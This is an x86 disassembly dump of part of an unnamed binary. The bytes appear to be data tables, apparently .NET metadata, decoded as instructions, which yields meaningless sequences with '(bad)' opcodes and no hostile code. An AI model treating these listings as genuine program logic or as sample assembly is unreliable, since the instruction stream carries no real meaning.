  4069ce:	86 08                	xchg   %cl,(%eax)
  4069d0:	fb                   	sti
  4069d1:	07                   	pop    %es
  4069d2:	5f                   	pop    %edi
  4069d3:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069d7:	25 00 00 00 00       	and    $0x0,%eax
  4069dc:	e1 01                	loope  0x4069df
  4069de:	cc                   	int3
  4069df:	14 64                	adc    $0x64,%al
  4069e1:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069e5:	25 00 00 00 00       	and    $0x0,%eax
  4069ea:	86 18                	xchg   %bl,(%eax)
  4069ec:	03 15 0e 00 5c 00    	add    0x5c000e,%edx
  4069f2:	28 55 00             	sub    %dl,0x0(%ebp)
  4069f5:	00 00                	add    %al,(%eax)
  4069f7:	00 96 00 42 0c b1    	add    %dl,-0x4ef3be00(%esi)
  4069fd:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  406a01:	25 00 00 00 00       	and    $0x0,%eax
  406a06:	96                   	xchg   %eax,%esi
  406a07:	00 42 0c             	add    %al,0xc(%edx)
  406a0a:	b8 02 5e 00 4c       	mov    $0x4c005e02,%eax
  406a0f:	55                   	push   %ebp
  406a10:	00 00                	add    %al,(%eax)
  406a12:	00 00                	add    %al,(%eax)
  406a14:	96                   	xchg   %eax,%esi
  406a15:	00 42 0c             	add    %al,0xc(%edx)
  406a18:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a1d:	20 00                	and    %al,(%eax)
  406a1f:	00 00                	add    %al,(%eax)
  406a21:	00 86 18 03 15 0e    	add    %al,0xe150318(%esi)
  406a27:	00 61 00             	add    %ah,0x0(%ecx)
  406a2a:	9e                   	sahf
  406a2b:	25 00 00 00 00       	and    $0x0,%eax
  406a30:	96                   	xchg   %eax,%esi
  406a31:	00 43 0f             	add    %al,0xf(%ebx)
  406a34:	c5 02                	lds    (%edx),%eax
  406a36:	61                   	popa
  406a37:	00 0c 56             	add    %cl,(%esi,%edx,2)
  406a3a:	00 00                	add    %al,(%eax)
  406a3c:	00 00                	add    %al,(%eax)
  406a3e:	96                   	xchg   %eax,%esi
  406a3f:	00 5c 0c cb          	add    %bl,-0x35(%esp,%ecx,1)
  406a43:	02 62 00             	add    0x0(%edx),%ah
  406a46:	d4 56                	aam    $0x56
  406a48:	00 00                	add    %al,(%eax)
  406a4a:	00 00                	add    %al,(%eax)
  406a4c:	96                   	xchg   %eax,%esi
  406a4d:	00 38                	add    %bh,(%eax)
  406a4f:	1d d2 02 64 00       	sbb    $0x6402d2,%eax
  406a54:	ab                   	stos   %eax,%es:(%edi)
  406a55:	25 00 00 00 00       	and    $0x0,%eax
  406a5a:	96                   	xchg   %eax,%esi
  406a5b:	00 d9                	add    %bl,%cl
  406a5d:	18 da                	sbb    %bl,%dl
  406a5f:	02 66 00             	add    0x0(%esi),%ah
  406a62:	c6                   	(bad)
  406a63:	25 00 00 00 00       	and    $0x0,%eax
  406a68:	96                   	xchg   %eax,%esi
  406a69:	00 2c 06             	add    %ch,(%esi,%eax,1)
  406a6c:	e1 02                	loope  0x406a70
  406a6e:	68 00 e6 25 00       	push   $0x25e600
  406a73:	00 00                	add    %al,(%eax)
  406a75:	00 96 00 66 10 e8    	add    %dl,-0x17ef9a00(%esi)
  406a7b:	02 6a 00             	add    0x0(%edx),%ch
  406a7e:	74 57                	je     0x406ad7
  406a80:	00 00                	add    %al,(%eax)
  406a82:	00 00                	add    %al,(%eax)
  406a84:	96                   	xchg   %eax,%esi
  406a85:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a8b:	00 a4 57 00 00 00 00 	add    %ah,0x0(%edi,%edx,2)
  406a92:	96                   	xchg   %eax,%esi
  406a93:	00 a6 13 f6 02 6e    	add    %ah,0x6e02f613(%esi)
  406a99:	00 78 20             	add    %bh,0x20(%eax)
  406a9c:	00 00                	add    %al,(%eax)
  406a9e:	00 00                	add    %al,(%eax)
  406aa0:	86 18                	xchg   %bl,(%eax)
  406aa2:	03 15 0e 00 70 00    	add    0x70000e,%edx
  406aa8:	e8 58 00 00 00       	call   0x406b05
  406aad:	00 96 00 69 18 84    	add    %dl,-0x7be79700(%esi)
  406ab3:	01 70 00             	add    %esi,0x0(%eax)
  406ab6:	74 59                	je     0x406b11
  406ab8:	00 00                	add    %al,(%eax)
  406aba:	00 00                	add    %al,(%eax)
  406abc:	96                   	xchg   %eax,%esi
  406abd:	00 60 18             	add    %ah,0x18(%eax)
  406ac0:	84 01                	test   %al,(%ecx)
  406ac2:	71 00                	jno    0x406ac4
  406ac4:	00 00                	add    %al,(%eax)
  406ac6:	01 00                	add    %eax,(%eax)
  406ac8:	c8 0a 00 00          	enter  $0xa,$0x0
  406acc:	01 00                	add    %eax,(%eax)
  406ace:	c8 0a 00 00          	enter  $0xa,$0x0
  406ad2:	01 00                	add    %eax,(%eax)
  406ad4:	c8 0a 00 00          	enter  $0xa,$0x0
  406ad8:	01 00                	add    %eax,(%eax)
  406ada:	c8 0a 00 00          	enter  $0xa,$0x0
  406ade:	01 00                	add    %eax,(%eax)
  406ae0:	c8 0a 00 00          	enter  $0xa,$0x0
  406ae4:	01 00                	add    %eax,(%eax)
  406ae6:	c8 0a 00 00          	enter  $0xa,$0x0
  406aea:	01 00                	add    %eax,(%eax)
  406aec:	c8 0a 00 00          	enter  $0xa,$0x0
  406af0:	01 00                	add    %eax,(%eax)
  406af2:	c8 0a 00 00          	enter  $0xa,$0x0
  406af6:	01 00                	add    %eax,(%eax)
  406af8:	c8 0a 00 00          	enter  $0xa,$0x0
  406afc:	01 00                	add    %eax,(%eax)
  406afe:	c8 0a 00 00          	enter  $0xa,$0x0
  406b02:	01 00                	add    %eax,(%eax)
  406b04:	a9 07 00 00 01       	test   $0x1000007,%eax
  406b09:	00 50 13             	add    %dl,0x13(%eax)
  406b0c:	00 00                	add    %al,(%eax)
  406b0e:	02 00                	add    (%eax),%al
  406b10:	ae                   	scas   %es:(%edi),%al
  406b11:	08 00                	or     %al,(%eax)
  406b13:	00 03                	add    %al,(%ebx)
  406b15:	00 ae 10 00 00 04    	add    %ch,0x4000010(%esi)
  406b1b:	00 20                	add    %ah,(%eax)
  406b1d:	18 00                	sbb    %al,(%eax)
  406b1f:	00 01                	add    %al,(%ecx)
  406b21:	00 d0                	add    %dl,%al
  406b23:	12 00                	adc    (%eax),%al
  406b25:	00 01                	add    %al,(%ecx)
  406b27:	00 17                	add    %dl,(%edi)
  406b29:	0d 00 00 01 00       	or     $0x10000,%eax
  406b2e:	bd 0d 00 00 01       	mov    $0x100000d,%ebp
  406b33:	00 bd 0d 00 00 01    	add    %bh,0x100000d(%ebp)
  406b39:	00 27                	add    %ah,(%edi)
  406b3b:	0d 00 00 01 00       	or     $0x10000,%eax
  406b40:	d2 18                	rcrb   %cl,(%eax)
  406b42:	00 00                	add    %al,(%eax)
  406b44:	01 00                	add    %eax,(%eax)
  406b46:	c6 04 00 00          	movb   $0x0,(%eax,%eax,1)
  406b4a:	02 00                	add    (%eax),%al
  406b4c:	fb                   	sti
  406b4d:	1b 00                	sbb    (%eax),%eax
  406b4f:	00 03                	add    %al,(%ebx)
  406b51:	00 60 1b             	add    %ah,0x1b(%eax)
  406b54:	00 00                	add    %al,(%eax)
  406b56:	01 00                	add    %eax,(%eax)
  406b58:	31 07                	xor    %eax,(%edi)
  406b5a:	00 00                	add    %al,(%eax)
  406b5c:	01 00                	add    %eax,(%eax)
  406b5e:	3b 18                	cmp    (%eax),%ebx
  406b60:	00 00                	add    %al,(%eax)
  406b62:	02 00                	add    (%eax),%al
  406b64:	1e                   	push   %ds
  406b65:	1b 00                	sbb    (%eax),%eax
  406b67:	00 01                	add    %al,(%ecx)
  406b69:	00 f9                	add    %bh,%cl
  406b6b:	16                   	push   %ss
  406b6c:	00 00                	add    %al,(%eax)
  406b6e:	01 00                	add    %eax,(%eax)
  406b70:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b75:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b7b:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b81:	00 50 13             	add    %dl,0x13(%eax)
  406b84:	00 00                	add    %al,(%eax)
  406b86:	02 00                	add    (%eax),%al
  406b88:	69 0b 00 00 01 00    	imul   $0x10000,(%ebx),%ecx
  406b8e:	a9 07 00 00 02       	test   $0x2000007,%eax
  406b93:	00 c8                	add    %cl,%al
  406b95:	0a 00                	or     (%eax),%al
  406b97:	00 01                	add    %al,(%ecx)
  406b99:	00 c8                	add    %cl,%al
  406b9b:	0a 00                	or     (%eax),%al
  406b9d:	00 01                	add    %al,(%ecx)
  406b9f:	00 a9 07 00 00 01    	add    %ch,0x1000007(%ecx)
  406ba5:	00 ba 02 00 00 01    	add    %bh,0x1000002(%edx)
  406bab:	00 24 0e             	add    %ah,(%esi,%ecx,1)
  406bae:	00 00                	add    %al,(%eax)
  406bb0:	01 00                	add    %eax,(%eax)
  406bb2:	43                   	inc    %ebx
  406bb3:	1c 00                	sbb    $0x0,%al
  406bb5:	00 01                	add    %al,(%ecx)
  406bb7:	00 df                	add    %bl,%bh
  406bb9:	1c 00                	sbb    $0x0,%al
  406bbb:	00 01                	add    %al,(%ecx)
  406bbd:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bc3:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bc9:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bcf:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bd5:	00 32                	add    %dh,(%edx)
  406bd7:	00 00                	add    %al,(%eax)
  406bd9:	00 02                	add    %al,(%edx)
  406bdb:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406be1:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406be7:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406bed:	00 bd 18 00 00 01    	add    %bh,0x1000018(%ebp)
  406bf3:	00 4d 16             	add    %cl,0x16(%ebp)
  406bf6:	00 00                	add    %al,(%eax)
  406bf8:	01 00                	add    %eax,(%eax)
  406bfa:	c9                   	leave
  406bfb:	16                   	push   %ss
  406bfc:	00 00                	add    %al,(%eax)
  406bfe:	01 00                	add    %eax,(%eax)
  406c00:	c9                   	leave
  406c01:	16                   	push   %ss
  406c02:	00 00                	add    %al,(%eax)
  406c04:	01 00                	add    %eax,(%eax)
  406c06:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406c09:	00 01                	add    %al,(%ecx)
  406c0b:	00 00                	add    %al,(%eax)
  406c0d:	1c 00                	sbb    $0x0,%al
  406c0f:	00 01                	add    %al,(%ecx)
  406c11:	00 00                	add    %al,(%eax)
  406c13:	1c 00                	sbb    $0x0,%al
  406c15:	00 01                	add    %al,(%ecx)
  406c17:	00 00                	add    %al,(%eax)
  406c19:	1c 00                	sbb    $0x0,%al
  406c1b:	00 01                	add    %al,(%ecx)
  406c1d:	00 00                	add    %al,(%eax)
  406c1f:	1c 00                	sbb    $0x0,%al
  406c21:	00 01                	add    %al,(%ecx)
  406c23:	00 bd 0d 00 00 01    	add    %bh,0x100000d(%ebp)
  406c29:	00 aa 0d 00 00 02    	add    %ch,0x200000d(%edx)
  406c2f:	00 b5 0d 00 00 01    	add    %dh,0x100000d(%ebp)
  406c35:	00 c8                	add    %cl,%al
  406c37:	0a 00                	or     (%eax),%al
  406c39:	00 01                	add    %al,(%ecx)
  406c3b:	00 c8                	add    %cl,%al
  406c3d:	0a 00                	or     (%eax),%al
  406c3f:	00 01                	add    %al,(%ecx)
  406c41:	00 c8                	add    %cl,%al
  406c43:	0a 00                	or     (%eax),%al
  406c45:	00 01                	add    %al,(%ecx)
  406c47:	00 29                	add    %ch,(%ecx)
  406c49:	1c 00                	sbb    $0x0,%al
  406c4b:	00 01                	add    %al,(%ecx)
  406c4d:	00 c8                	add    %cl,%al
  406c4f:	0a 00                	or     (%eax),%al
  406c51:	00 01                	add    %al,(%ecx)
  406c53:	00 a9 07 00 00 01    	add    %ch,0x1000007(%ecx)
  406c59:	00 a9 07 00 00 01    	add    %ch,0x1000007(%ecx)
  406c5f:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406c65:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406c6b:	00 c8                	add    %cl,%al
  406c6d:	0a 00                	or     (%eax),%al
  406c6f:	00 01                	add    %al,(%ecx)
  406c71:	00 c8                	add    %cl,%al
  406c73:	0a 00                	or     (%eax),%al
  406c75:	00 01                	add    %al,(%ecx)
  406c77:	00 c8                	add    %cl,%al
  406c79:	0a 00                	or     (%eax),%al
  406c7b:	00 01                	add    %al,(%ecx)
  406c7d:	00 f6                	add    %dh,%dh
  406c7f:	1c 00                	sbb    $0x0,%al
  406c81:	00 02                	add    %al,(%edx)
  406c83:	00 c8                	add    %cl,%al
  406c85:	0a 00                	or     (%eax),%al
  406c87:	00 01                	add    %al,(%ecx)
  406c89:	00 f6                	add    %dh,%dh
  406c8b:	1c 00                	sbb    $0x0,%al
  406c8d:	00 02                	add    %al,(%edx)
  406c8f:	00 c8                	add    %cl,%al
  406c91:	0a 00                	or     (%eax),%al
  406c93:	00 01                	add    %al,(%ecx)
  406c95:	00 28                	add    %ch,(%eax)
  406c97:	07                   	pop    %es
  406c98:	00 00                	add    %al,(%eax)
  406c9a:	01 00                	add    %eax,(%eax)
  406c9c:	28 07                	sub    %al,(%edi)
  406c9e:	00 00                	add    %al,(%eax)
  406ca0:	01 00                	add    %eax,(%eax)
  406ca2:	69 0d 00 00 01 00 c8 	imul   $0xac8,0x10000,%ecx
  406ca9:	0a 00 00 
  406cac:	01 00                	add    %eax,(%eax)
  406cae:	6a 0e                	push   $0xe
  406cb0:	00 00                	add    %al,(%eax)
  406cb2:	01 00                	add    %eax,(%eax)
  406cb4:	6f                   	outsl  %ds:(%esi),(%dx)
  406cb5:	0e                   	push   %cs
  406cb6:	00 00                	add    %al,(%eax)
  406cb8:	01 00                	add    %eax,(%eax)
  406cba:	6f                   	outsl  %ds:(%esi),(%dx)
  406cbb:	0e                   	push   %cs
  406cbc:	00 00                	add    %al,(%eax)
  406cbe:	01 00                	add    %eax,(%eax)
  406cc0:	c9                   	leave
  406cc1:	16                   	push   %ss
  406cc2:	00 00                	add    %al,(%eax)
  406cc4:	01 00                	add    %eax,(%eax)
  406cc6:	28 07                	sub    %al,(%edi)
  406cc8:	00 00                	add    %al,(%eax)
  406cca:	01 00                	add    %eax,(%eax)
  406ccc:	ba 17 00 00 01       	mov    $0x1000017,%edx
  406cd1:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406cd7:	00 c8                	add    %cl,%al
  406cd9:	0a 00                	or     (%eax),%al
  406cdb:	00 01                	add    %al,(%ecx)
  406cdd:	00 c8                	add    %cl,%al
  406cdf:	0a 00                	or     (%eax),%al
  406ce1:	00 01                	add    %al,(%ecx)
  406ce3:	00 c8                	add    %cl,%al
  406ce5:	0a 00                	or     (%eax),%al
  406ce7:	00 01                	add    %al,(%ecx)
  406ce9:	00 ba 17 00 00 02    	add    %bh,0x2000017(%edx)
  406cef:	00 92 10 00 00 01    	add    %dl,0x1000010(%edx)
  406cf5:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406cfb:	00 73 0b             	add    %dh,0xb(%ebx)
  406cfe:	00 00                	add    %al,(%eax)
  406d00:	02 00                	add    (%eax),%al
  406d02:	ba 17 00 00 01       	mov    $0x1000017,%edx
  406d07:	00 ba 17 00 00 01    	add    %bh,0x1000017(%edx)
  406d0d:	00 ba 17 00 00 02    	add    %bh,0x2000017(%edx)
  406d13:	00 79 0e             	add    %bh,0xe(%ecx)
  406d16:	00 00                	add    %al,(%eax)
  406d18:	01 00                	add    %eax,(%eax)
  406d1a:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d1f:	00 c0                	add    %al,%al
  406d21:	16                   	push   %ss
  406d22:	00 00                	add    %al,(%eax)
  406d24:	01 00                	add    %eax,(%eax)
  406d26:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d2b:	00 6f 0e             	add    %ch,0xe(%edi)
  406d2e:	00 00                	add    %al,(%eax)
  406d30:	01 00                	add    %eax,(%eax)
  406d32:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d37:	00 6f 0e             	add    %ch,0xe(%edi)
  406d3a:	00 00                	add    %al,(%eax)
  406d3c:	01 00                	add    %eax,(%eax)
  406d3e:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d43:	00 6a 0e             	add    %ch,0xe(%edx)
  406d46:	00 00                	add    %al,(%eax)
  406d48:	01 00                	add    %eax,(%eax)
  406d4a:	ba 17 00 00 02       	mov    $0x2000017,%edx
  406d4f:	00 74 0e 00          	add    %dh,0x0(%esi,%ecx,1)
  406d53:	00 01                	add    %al,(%ecx)
  406d55:	00 ba 17 00 00 02    	add    %bh,0x2000017(%edx)
  406d5b:	00 74 0e 00          	add    %dh,0x0(%esi,%ecx,1)
  406d5f:	00 01                	add    %al,(%ecx)
  406d61:	00 b3 1b 00 00 01    	add    %dh,0x100001b(%ebx)
  406d67:	00 b3 1b 16 00 59    	add    %dh,0x5900161b(%ebx)
  406d6d:	00 18                	add    %bl,(%eax)
  406d6f:	00 5d 00             	add    %bl,0x0(%ebp)
  406d72:	b1 00                	mov    $0x0,%cl
  406d74:	ec                   	in     (%dx),%al
  406d75:	1a bb 01 b1 00 d8    	sbb    -0x27ff4eff(%ebx),%bh
  406d7b:	1b bf 01 b1 00 c7    	sbb    -0x38ff4eff(%edi),%edi
  406d81:	19 0e                	sbb    %ecx,(%esi)
  406d83:	00 b9 00 eb 14 64    	add    %bh,0x6414eb00(%ecx)
  406d89:	02 c9                	add    %cl,%cl
  406d8b:	00 03                	add    %al,(%ebx)
  406d8d:	15 01 03 d1 00       	adc    $0xd10301,%eax
  406d92:	03 15 0e 00 d9 00    	add    0xd9000e,%edx
  406d98:	03 15 2e 03 e9 00    	add    0xe9032e,%edx
  406d9e:	03 15 6b 01 f1 00    	add    0xf1016b,%edx
  406da4:	03 15 6b 01 f9 00    	add    0xf9016b,%edx
  406daa:	03 15 6b 01 01 01    	add    0x101016b,%edx
  406db0:	03 15 6b 01 09 01    	add    0x109016b,%edx
  406db6:	03 15 6b 01 11 01    	add    0x111016b,%edx
  406dbc:	03 15 6b 01 19 01    	add    0x119016b,%edx
  406dc2:	03 15 6b 01 21 01    	add    0x121016b,%edx
  406dc8:	03 15 6b 01 29 01    	add    0x129016b,%edx
  406dce:	03 15 6b 01 31 01    	add    0x131016b,%edx
  406dd4:	03 15 4b 02 39 01    	add    0x139024b,%edx
  406dda:	03 15 0e 00 41 01    	add    0x141000e,%edx
  406de0:	03 15 6b 01 49 01    	add    0x149016b,%edx
  406de6:	82 12 7f             	adcb   $0x7f,(%edx)
  406de9:	00 51 01             	add    %dl,0x1(%ecx)
  406dec:	6e                   	outsb  %ds:(%esi),(%dx)
  406ded:	00 c4                	add    %al,%ah
  406def:	03 59 01             	add    0x1(%ecx),%ebx
  406df2:	f1                   	int1
  406df3:	19 7f 00             	sbb    %edi,0x0(%edi)
  406df6:	51                   	push   %ecx
  406df7:	01 73 10             	add    %esi,0x10(%ebx)
  406dfa:	84 00                	test   %al,(%eax)
  406dfc:	09 00                	or     %eax,(%eax)
  406dfe:	03 15 0e 00 61 01    	add    0x161000e,%edx
  406e04:	37                   	aaa
  406e05:	01 cd                	add    %ecx,%ebp
  406e07:	03 51 01             	add    0x1(%ecx),%edx
  406e0a:	22 0c 2a             	and    (%edx,%ebp,1),%cl
  406e0d:	01 61 01             	add    %esp,0x1(%ecx)
  406e10:	b1 0c                	mov    $0xc,%cl
  406e12:	d3 03                	roll   %cl,(%ebx)
  406e14:	11 00                	adc    %eax,(%eax)
  406e16:	03 15 2b 02 11 00    	add    0x11022b,%edx
  406e1c:	c8 1c d9 03          	enter  $0xd91c,$0x3
  406e20:	69 01 93 1c df 03    	imul   $0x3df1c93,(%ecx),%eax
  406e26:	61                   	popa
  406e27:	01 b7 16 e5 03 81    	add    %esi,-0x7efc1aea(%edi)
  406e2d:	01 e2                	add    %esp,%edx
  406e2f:	01 c7                	add    %eax,%edi
  406e31:	00 79 01             	add    %bh,0x1(%ecx)
  406e34:	39 0d eb 03 19 00    	cmp    %ecx,0x1903eb
  406e3a:	03 15 09 04 19 00    	add    0x190409,%edx
  406e40:	49                   	dec    %ecx
  406e41:	0b 01                	or     (%ecx),%eax
  406e43:	03 19                	add    (%ecx),%ebx
  406e45:	00 36                	add    %dh,(%esi)
  406e47:	0b 01                	or     (%ecx),%eax
  406e49:	03 c1                	add    %ecx,%eax
  406e4b:	01 6d 1d             	add    %ebp,0x1d(%ebp)
  406e4e:	16                   	push   %ss
  406e4f:	04 c1                	add    $0xc1,%al
  406e51:	01 e3                	add    %esp,%ebx
  406e53:	19 1c 04             	sbb    %ebx,(%esp,%eax,1)
  406e56:	d1 01                	roll   $1,(%ecx)
  406e58:	03 15 0e 00 d1 01    	add    0x1d1000e,%edx
  406e5e:	dc 1b                	fcompl (%ebx)
  406e60:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e63:	01 f4                	add    %esi,%esp
  406e65:	15 28 04 19 00       	adc    $0x190428,%eax
  406e6a:	4a                   	dec    %edx
  406e6b:	19 30                	sbb    %esi,(%eax)
  406e6d:	04 19                	add    $0x19,%al
  406e6f:	00 3b                	add    %bh,(%ebx)
  406e71:	03 bf 01 19 00 4a    	add    0x4a001901(%edi),%edi
  406e77:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e7a:	99                   	cltd
  406e7b:	01 03                	add    %eax,(%ebx)
  406e7d:	15 0e 00 a1 01       	adc    $0x1a1000e,%eax
  406e82:	03 15 36 02 99 01    	add    0x1990236,%edx
  406e88:	64 17                	fs pop %ss
  406e8a:	38 04 99             	cmp    %al,(%ecx,%ebx,4)
  406e8d:	01 4d 0c             	add    %ecx,0xc(%ebp)
  406e90:	70 01                	jo     0x406e93
  406e92:	c1 01 e3             	roll   $0xe3,(%ecx)
  406e95:	19 3f                	sbb    %edi,(%edi)
  406e97:	04 d1                	add    $0xd1,%al
  406e99:	01 dc                	add    %ebx,%esp
  406e9b:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e9e:	f1                   	int1
  406e9f:	01 6b 08             	add    %ebp,0x8(%ebx)
  406ea2:	0e                   	push   %cs
  406ea3:	00 f9                	add    %bh,%cl
  406ea5:	01 03                	add    %eax,(%ebx)
  406ea7:	15 4f 04 01 02       	adc    $0x201044f,%eax
  406eac:	03 15 56 04 21 00    	add    0x210456,%edx
  406eb2:	03 15 5c 04 19 00    	add    0x19045c,%edx
  406eb8:	30 1b                	xor    %bl,(%ebx)
  406eba:	66 04 09             	data16 add $0x9,%al
  406ebd:	00 68 0c             	add    %ch,0xc(%eax)
  406ec0:	47                   	inc    %edi
  406ec1:	02 21                	add    (%ecx),%ah
  406ec3:	00 6c 1a 6c          	add    %ch,0x6c(%edx,%ebx,1)
  406ec7:	04 29                	add    $0x29,%al
  406ec9:	02 03                	add    (%ebx),%al
  406ecb:	15 56 04 29 00       	adc    $0x290456,%eax
  406ed0:	03 15 78 04 31 02    	add    0x2310478,%edx
  406ed6:	03 15 56 04 c1 00    	add    0xc10456,%edx
  406edc:	0e                   	push   %cs
  406edd:	03 82 04 39 02 9b    	add    -0x64fdc6fc(%edx),%eax
  406ee3:	07                   	pop    %es
  406ee4:	8f 04 31             	pop    (%ecx,%esi,1)
  406ee7:	00 74 17 96          	add    %dh,-0x6a(%edi,%edx,1)
  406eeb:	04 c1                	add    $0xc1,%al
  406eed:	00 6b 08             	add    %ch,0x8(%ebx)
  406ef0:	0e                   	push   %cs
  406ef1:	00 19                	add    %bl,(%ecx)
  406ef3:	00 6b 08             	add    %ch,0x8(%ebx)
  406ef6:	0e                   	push   %cs
  406ef7:	00 29                	add    %ch,(%ecx)
  406ef9:	00 6b 08             	add    %ch,0x8(%ebx)
  406efc:	0e                   	push   %cs
  406efd:	00 c1                	add    %al,%cl
  406eff:	00 06                	add    %al,(%esi)
  406f01:	03 a1 04 49 02 6e    	add    0x6e024904(%ecx),%esp
  406f07:	00 a7 04 c1 00 13    	add    %ah,0x1300c104(%edi)
  406f0d:	03 ae 04 51 02 03    	add    0x3025104(%esi),%ebp
  406f13:	15 56 04 49 01       	adc    $0x1490456,%eax
  406f18:	03 15 b6 04 49 01    	add    0x14904b6,%edx
  406f1e:	95                   	xchg   %eax,%ebp
  406f1f:	1b bd 04 61 02 84    	sbb    -0x7bfd9efc(%ebp),%edi
  406f25:	14 cf                	adc    $0xcf,%al
  406f27:	04 49                	add    $0x49,%al
  406f29:	02 b7 16 9f 01 19    	add    0x19019f16(%edi),%dh
  406f2f:	00 3e                	add    %bh,(%esi)
  406f31:	0f d6                	(bad)
  406f33:	04 c1                	add    $0xc1,%al
  406f35:	00 e9                	add    %ch,%cl
  406f37:	08 de                	or     %bl,%dh
  406f39:	04 59                	add    $0x59,%al
  406f3b:	02 03                	add    (%ebx),%al
  406f3d:	15 2b 02 c1 00       	adc    $0xc1022b,%eax
  406f42:	aa                   	stos   %al,%es:(%edi)
  406f43:	11 15 02 c1 00 44    	adc    %edx,0x4400c102
  406f49:	0d 0e 00 61 02       	or     $0x261000e,%eax
  406f4e:	f1                   	int1
  406f4f:	19 9a 00 71 02 42    	sbb    %ebx,0x42027100(%edx)
  406f55:	19 0a                	sbb    %ecx,(%edx)
  406f57:	00 59 01             	add    %bl,0x1(%ecx)
  406f5a:	cc                   	int3
  406f5b:	15 c7 00 a1 02       	adc    $0x2a100c7,%eax
  406f60:	e3 07                	jecxz  0x406f69
  406f62:	01 05 79 02 03 15    	add    %eax,0x15030279
  406f68:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f6b:	02 44 18 07          	add    0x7(%eax,%ebx,1),%al
  406f6f:	05 81 02 a9 06       	add    $0x6a90281,%eax
  406f74:	0d 05 a9 02 f2       	or     $0xf202a905,%eax
  406f79:	06                   	push   %es
  406f7a:	47                   	inc    %edi
  406f7b:	02 b1 02 5d 07 47    	add    0x47075d02(%ecx),%dh
  406f81:	02 c1                	add    %cl,%al
  406f83:	01 79 1d             	add    %edi,0x1d(%ecx)
  406f86:	16                   	push   %ss
  406f87:	04 81                	add    $0x81,%al
  406f89:	02 e7                	add    %bh,%ah
  406f8b:	15 13 05 81 02       	adc    $0x2810513,%eax
  406f90:	39 0f                	cmp    %ecx,(%edi)
  406f92:	0e                   	push   %cs
  406f93:	00 89 02 03 15 0e    	add    %cl,0xe150302(%ecx)
  406f99:	00 89 02 ff 06 6b    	add    %cl,0x6b06ff02(%ecx)
  406f9f:	01 b1 02 e9 06 47    	add    %esi,0x4706e902(%ecx)
  406fa5:	02 a1 02 e6 10 c7    	add    -0x38ef19fe(%ecx),%ah
  406fab:	00 c1                	add    %al,%cl
  406fad:	01 bf 18 1a 05 89    	add    %edi,-0x76fae5e8(%edi)
  406fb3:	02 87 18 6b 01 89    	add    -0x76fe94e8(%edi),%al
  406fb9:	02 c6                	add    %dh,%al
  406fbb:	06                   	push   %es
  406fbc:	20 05 89 02 16 1c    	and    %al,0x1c160289
  406fc2:	4b                   	dec    %ebx
  406fc3:	02 81 02 95 1b 27    	add    0x271b9502(%ecx),%al
  406fc9:	05 c1 02 60 14       	add    $0x146002c1,%eax
  406fce:	30 05 c9 02 79 08    	xor    %al,0x87902c9
  406fd4:	c7 00 91 02 bd 1c    	movl   $0x1cbd0291,(%eax)
  406fda:	35 05 c1 01 bf       	xor    $0xbf01c105,%eax
  406fdf:	18 3f                	sbb    %bh,(%edi)
  406fe1:	05 91 02 bf 0a       	add    $0xabf0291,%eax
  406fe6:	46                   	inc    %esi
  406fe7:	05 d9 02 a8 18       	add    $0x18a802d9,%eax
  406fec:	84 00                	test   %al,(%eax)
  406fee:	d9 02                	flds   (%edx)
  406ff0:	d9 08                	(bad) (%eax)
  406ff2:	3e 01 e1             	ds add %esp,%ecx
  406ff5:	02 03                	add    (%ebx),%al
  406ff7:	15 4c 05 d9 02       	adc    $0x2d9054c,%eax
  406ffc:	6a 16                	push   $0x16
  406ffe:	2a 01                	sub    (%ecx),%al
  407000:	a1 02 0c 07 c3       	mov    0xc3070c02,%eax
  407005:	00 c1                	add    %al,%cl
  407007:	01 bf 18 01 05 99    	add    %edi,-0x66fafee8(%edi)
  40700d:	02 03                	add    (%ebx),%al
  40700f:	15 6b 01 f1 02       	adc    $0x2f1016b,%eax
  407014:	d9 07                	flds   (%edi)
  407016:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407019:	02 5d 0d             	add    0xd(%ebp),%bl
  40701c:	c3                   	ret
  40701d:	00 a1 02 1c 07 c7    	add    %ah,-0x38f8e3fe(%ecx)
  407023:	00 89 02 07 0d 4b    	add    %cl,0x4b0d0702(%ecx)
  407029:	02 89 02 78 0a 4b    	add    0x4b0a7802(%ecx),%cl
  40702f:	02 59 01             	add    0x1(%ecx),%bl
  407032:	a3 1b 3e 01 59       	mov    %eax,0x59013e1b
  407037:	01 4d 1d             	add    %ecx,0x1d(%ebp)
  40703a:	c3                   	ret
  40703b:	00 a1 02 66 1b c7    	add    %ah,-0x38e499fe(%ecx)
  407041:	00 f9                	add    %bh,%cl
  407043:	02 03                	add    (%ebx),%al
  407045:	15 6b 01 f9 02       	adc    $0x2f9016b,%eax
  40704a:	0a 0b                	or     (%ebx),%cl
  40704c:	23 02                	and    (%edx),%eax
  40704e:	01 03                	add    %eax,(%ebx)
  407050:	03 15 0e 00 01 03    	add    0x301000e,%edx
  407056:	4e                   	dec    %esi
